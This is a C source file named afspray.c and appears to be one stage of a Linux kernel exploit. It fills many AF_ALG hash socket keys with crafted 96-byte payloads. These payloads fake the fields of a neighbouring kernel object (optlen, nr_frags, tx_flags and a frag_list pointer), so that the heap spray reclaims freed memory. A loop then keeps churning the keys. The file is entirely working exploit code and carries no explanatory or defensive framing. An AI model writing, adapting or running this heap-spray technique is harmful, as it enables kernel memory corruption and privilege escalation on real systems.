/* afspray.c <cpu> <S> [nsocks]
 *
 * Extra reclaim bucket: AF_ALG key buffer (full user-controlled 96 bytes).
 * socket(AF_ALG, SOCK_SEQPACKET, 0) + bind("hash","hmac(sha256)") +
 * setsockopt(SOL_ALG, ALG_SET_KEY, key, 96).  The key is stored in the
 * af_alg module context; the allocation call site is module text, so its
 * random-kmalloc bucket is per-boot (module KASLR) rather than fixed.
 * Layout is the raw key bytes:
 *   key[24]       -> optlen (160)
 *   key[82/83]    -> neighbour+82/83 = nr_frags/tx_flags (0)
 *   key[88..95]   -> neighbour+88..95 = frag_list = S
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/if_alg.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <cpu> <S> [nsocks]\n", argv[0]);
        return 1;
    }
    int cpu = atoi(argv[1]);
    unsigned long long S = strtoull(argv[2], NULL, 0);
    int n = argc > 3 ? atoi(argv[3]) : 256;
    if (n > 60000) n = 60000;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);

    struct sockaddr_alg sa;
    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "hash");
    strcpy((char *)sa.salg_name, "hmac(sha256)");

    unsigned char key[96];
    memset(key, 0, sizeof(key));
    key[24] = 160;                 /* optlen at object+24 */
    key[82] = 0;                   /* neighbour+82: nr_frags */
    key[83] = 0;                   /* neighbour+83: tx_flags */
    memcpy(key + 88, &S, 8);       /* neighbour+88..95: frag_list */

    int *fds = calloc(n, sizeof(int));
    if (!fds) return 1;
    int made = 0;
    for (int i = 0; i < n; i++) {
        int fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
        if (fd < 0) { perror("socket(AF_ALG)"); break; }
        if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            perror("bind(AF_ALG)");
            close(fd);
            break;
        }
        if (setsockopt(fd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0) {
            perror("ALG_SET_KEY");
            close(fd);
            break;
        }
        fds[made++] = fd;
    }
    fprintf(stderr, "afspray cpu=%d S=%#llx made=%d\n", cpu, S, made);
    if (!made) return 1;
    int idx = 0;
    unsigned long it = 0;
    for (;;) {
        setsockopt(fds[idx], SOL_ALG, ALG_SET_KEY, key, sizeof(key));
        idx = (idx + 1) % made;
        it++;
        if ((it & 0x3ff) == 0) fprintf(stderr, "churn=%lu\n", it);
    }
}
